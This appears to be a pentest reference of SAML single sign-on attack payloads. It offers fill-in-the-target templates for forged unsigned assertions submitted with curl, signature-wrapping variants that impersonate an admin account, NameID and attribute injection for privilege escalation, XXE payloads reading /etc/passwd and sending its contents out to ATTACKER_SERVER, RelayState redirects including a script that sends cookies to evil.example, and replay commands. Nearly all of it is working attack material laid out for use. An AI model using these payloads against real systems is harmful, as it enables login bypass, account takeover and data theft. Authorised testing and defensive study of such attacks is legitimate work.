# SAML Attack Payloads

Templates and payloads for SAML SSO security testing. Organized by attack class:
unsigned assertion, signature wrapping, attribute manipulation, and XXE.

## Unsigned Assertion Template

### Minimal SAML Response (No Signature)

Replace `{SP_ACS_URL}`, `{SP_ENTITY_ID}`, `{TARGET_EMAIL}`, and `{IDP_ENTITY_ID}` with target values.

```xml
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_response_001"
                Version="2.0"
                IssueInstant="2025-01-01T00:00:00Z"
                Destination="{SP_ACS_URL}"
                InResponseTo="_request_001">
  <saml:Issuer>{IDP_ENTITY_ID}</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                  ID="_assertion_001"
                  Version="2.0"
                  IssueInstant="2025-01-01T00:00:00Z">
    <saml:Issuer>{IDP_ENTITY_ID}</saml:Issuer>
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">{TARGET_EMAIL}</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData InResponseTo="_request_001"
                                       NotOnOrAfter="2030-12-31T23:59:59Z"
                                       Recipient="{SP_ACS_URL}"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="2020-01-01T00:00:00Z" NotOnOrAfter="2030-12-31T23:59:59Z">
      <saml:AudienceRestriction>
        <saml:Audience>{SP_ENTITY_ID}</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AuthnStatement AuthnInstant="2025-01-01T00:00:00Z">
      <saml:AuthnContext>
        <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml:AuthnContextClassRef>
      </saml:AuthnContext>
    </saml:AuthnStatement>
    <saml:AttributeStatement>
      <saml:Attribute Name="email">
        <saml:AttributeValue>{TARGET_EMAIL}</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>
```

### Usage

```bash
# 1. Save the template as response.xml with target values filled in
# 2. Base64-encode
base64 -w0 response.xml > response_b64.txt
# 3. URL-encode if needed (for form POST)
# 4. Submit to ACS endpoint
curl -X POST "{SP_ACS_URL}" \
  -d "SAMLResponse=$(cat response_b64.txt)" \
  -d "RelayState=/" \
  -v
```

---

## Signature Wrapping (XSW) Variants

### XSW1: Forged Assertion Before Signed Assertion

```xml
<samlp:Response>
  <!-- FORGED: unsigned, contains attacker's target identity -->
  <saml:Assertion ID="_forged">
    <saml:Subject>
      <saml:NameID>admin@target.example</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
  <!-- GENUINE: signed, original identity -->
  <saml:Assertion ID="_genuine">
    <ds:Signature>
      <ds:SignedInfo>
        <ds:Reference URI="#_genuine"/>
      </ds:SignedInfo>
    </ds:Signature>
    <saml:Subject>
      <saml:NameID>user@target.example</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

### XSW2: Forged Assertion After Signed Assertion

```xml
<samlp:Response>
  <!-- GENUINE: signed -->
  <saml:Assertion ID="_genuine">
    <ds:Signature>
      <ds:SignedInfo>
        <ds:Reference URI="#_genuine"/>
      </ds:SignedInfo>
    </ds:Signature>
    <saml:Subject>
      <saml:NameID>user@target.example</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
  <!-- FORGED: unsigned, after the signed one -->
  <saml:Assertion ID="_forged">
    <saml:Subject>
      <saml:NameID>admin@target.example</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

### XSW3: Genuine Wrapped Inside Forged

```xml
<saml:Assertion ID="_forged">
  <saml:Subject>
    <saml:NameID>admin@target.example</saml:NameID>
  </saml:Subject>
  <!-- Genuine assertion nested inside (signature still validates over its subtree) -->
  <saml:Assertion ID="_genuine">
    <ds:Signature>
      <ds:SignedInfo>
        <ds:Reference URI="#_genuine"/>
      </ds:SignedInfo>
    </ds:Signature>
    <saml:Subject>
      <saml:NameID>user@target.example</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</saml:Assertion>
```

### XSW4: Forged Nested in Extensions

```xml
<samlp:Response>
  <saml:Assertion ID="_genuine">
    <ds:Signature>
      <ds:SignedInfo>
        <ds:Reference URI="#_genuine"/>
      </ds:SignedInfo>
    </ds:Signature>
    <saml:Subject>
      <saml:NameID>user@target.example</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
  <samlp:Extensions>
    <saml:Assertion ID="_forged">
      <saml:Subject>
        <saml:NameID>admin@target.example</saml:NameID>
      </saml:Subject>
    </saml:Assertion>
  </samlp:Extensions>
</samlp:Response>
```

### XSW7: Forged in Object Element of Signature

```xml
<saml:Assertion ID="_genuine">
  <ds:Signature>
    <ds:SignedInfo>
      <ds:Reference URI="#_genuine"/>
    </ds:SignedInfo>
    <ds:Object>
      <!-- Forged assertion hidden inside the Signature's Object element -->
      <saml:Assertion ID="_forged">
        <saml:Subject>
          <saml:NameID>admin@target.example</saml:NameID>
        </saml:Subject>
      </saml:Assertion>
    </ds:Object>
  </ds:Signature>
  <saml:Subject>
    <saml:NameID>user@target.example</saml:NameID>
  </saml:Subject>
</saml:Assertion>
```

---

## NameID Manipulation Payloads

### Comment Injection

```xml
<!-- Parser difference: XML strips comments, string matching may not -->
<saml:NameID>admin@target.example<!-- ignored --></saml:NameID>
<saml:NameID>admin<!-- @evil.example -->@target.example</saml:NameID>
<saml:NameID>admin@target.example<!---->@evil.example</saml:NameID>

<!-- Multi-byte comment -->
<saml:NameID>admin@target.example<!-- .evil.example --></saml:NameID>
```

### Encoding Attacks

```xml
<!-- Null byte (may truncate in downstream processing) -->
<saml:NameID>admin@target.example&#x00;@evil.example</saml:NameID>

<!-- Unicode normalization -->
<saml:NameID>ⓐdmin@target.example</saml:NameID>
<saml:NameID>admin＠target.example</saml:NameID>

<!-- Case manipulation -->
<saml:NameID>ADMIN@TARGET.COM</saml:NameID>
<saml:NameID>Admin@Target.Com</saml:NameID>

<!-- Whitespace injection -->
<saml:NameID> admin@target.example</saml:NameID>
<saml:NameID>admin@target.example </saml:NameID>
<saml:NameID>admin@target.example&#x09;</saml:NameID>
```

### Domain Confusion

```xml
<!-- Subdomain matching bypass -->
<saml:NameID>admin@evil-target.example</saml:NameID>
<saml:NameID>admin@target.example.evil.example</saml:NameID>

<!-- Plus addressing (may map to different mailbox/user) -->
<saml:NameID>admin+test@target.example</saml:NameID>
```

---

## Attribute Injection Payloads

### Role Escalation

```xml
<saml:AttributeStatement>
  <saml:Attribute Name="role">
    <saml:AttributeValue>admin</saml:AttributeValue>
  </saml:Attribute>
  <saml:Attribute Name="groups">
    <saml:AttributeValue>Domain Admins</saml:AttributeValue>
    <saml:AttributeValue>Enterprise Admins</saml:AttributeValue>
  </saml:Attribute>
  <saml:Attribute Name="is_staff">
    <saml:AttributeValue>true</saml:AttributeValue>
  </saml:Attribute>
  <saml:Attribute Name="permissions">
    <saml:AttributeValue>*</saml:AttributeValue>
  </saml:Attribute>
</saml:AttributeStatement>
```

### Multi-Value Attribute Injection

```xml
<!-- Inject additional attribute values alongside legitimate ones -->
<saml:Attribute Name="memberOf">
  <saml:AttributeValue>CN=Users,DC=target,DC=com</saml:AttributeValue>
  <saml:AttributeValue>CN=Domain Admins,DC=target,DC=com</saml:AttributeValue>
</saml:Attribute>
```

---

## Condition Manipulation

### Extend Validity Window

```xml
<!-- Far past NotBefore, far future NotOnOrAfter -->
<saml:Conditions NotBefore="2000-01-01T00:00:00Z" NotOnOrAfter="2099-12-31T23:59:59Z">
```

### Remove Audience Restriction

```xml
<!-- Omit AudienceRestriction entirely -->
<saml:Conditions NotBefore="2020-01-01T00:00:00Z" NotOnOrAfter="2030-12-31T23:59:59Z">
  <!-- No AudienceRestriction element -->
</saml:Conditions>
```

### Wrong Audience (Cross-SP Attack)

```xml
<saml:AudienceRestriction>
  <saml:Audience>https://other-app.target.example/saml/metadata</saml:Audience>
</saml:AudienceRestriction>
```

---

## XXE via SAML

### Basic File Read

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:Subject>
      <saml:NameID>&xxe;</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

### OOB XXE (Blind)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER_SERVER/xxe.dtd">
  %xxe;
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:Subject>
      <saml:NameID>test@target.example</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>
```

External DTD (`xxe.dtd`):
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_SERVER/?data=%file;'>">
%eval;
%exfil;
```

### XXE via SAML Metadata

If the SP fetches metadata from a URL you control:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata"
                  entityID="&xxe;">
  <SPSSODescriptor>
    <AssertionConsumerService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST"
                              Location="https://evil.example/acs"/>
  </SPSSODescriptor>
</EntityDescriptor>
```

---

## RelayState Redirect Payloads

```
# Basic external redirect
RelayState=https://evil.example
RelayState=//evil.example
RelayState=https://target.example@evil.example
RelayState=https://evil.example%23.target.example

# Protocol-relative
RelayState=//evil.example/steal-token
RelayState=///evil.example

# URL encoding bypass
RelayState=https%3A%2F%2Fevil.example
RelayState=%68%74%74%70%73%3A%2F%2Fevil.example

# JavaScript (if RelayState used in script context)
RelayState=javascript:document.location='https://evil.example/?c='+document.cookie

# Data URI
RelayState=data:text/html,<script>location='https://evil.example'</script>

# Domain confusion
RelayState=https://target.example.evil.example
RelayState=https://evil-target.example
RelayState=https://target.example%00.evil.example

# Path traversal
RelayState=/../../../evil-path
RelayState=/..%252f..%252f
```

---

## Replay Attack Payloads

```bash
# Capture valid SAMLResponse, then replay:

# 1. Same browser, same session (should fail - already consumed)
curl -X POST "{SP_ACS_URL}" -d "SAMLResponse=$CAPTURED&RelayState=/"

# 2. Different browser/session (should fail - InResponseTo mismatch)
curl -X POST "{SP_ACS_URL}" -d "SAMLResponse=$CAPTURED&RelayState=/" -H "Cookie: new_session"

# 3. After NotOnOrAfter (should fail - expired)
# Wait for condition expiry, then replay

# 4. Remove InResponseTo (may bypass replay detection)
# Edit XML: remove InResponseTo attribute from SubjectConfirmationData
```

---

## Library-Specific Payloads

### passport-saml (Node.js) — CVE-2022-39299

```xml
<!-- Signature wrapping via duplicate assertion -->
<!-- passport-saml validated signature on first assertion but used second for auth -->
```

### ruby-saml — CVE-2024-45409

```xml
<!-- Digest value manipulation with signature wrapping -->
<!-- ruby-saml checked signature of Response, not Assertion -->
```

### python3-saml (OneLogin)

```xml
<!-- Relaxed InResponseTo validation in older versions -->
<!-- Remove InResponseTo entirely and submit unsolicited response -->
<samlp:Response ID="_response_unsolicited" Version="2.0"
                IssueInstant="2025-01-01T00:00:00Z"
                Destination="{SP_ACS_URL}">
  <!-- No InResponseTo attribute -->
</samlp:Response>
```
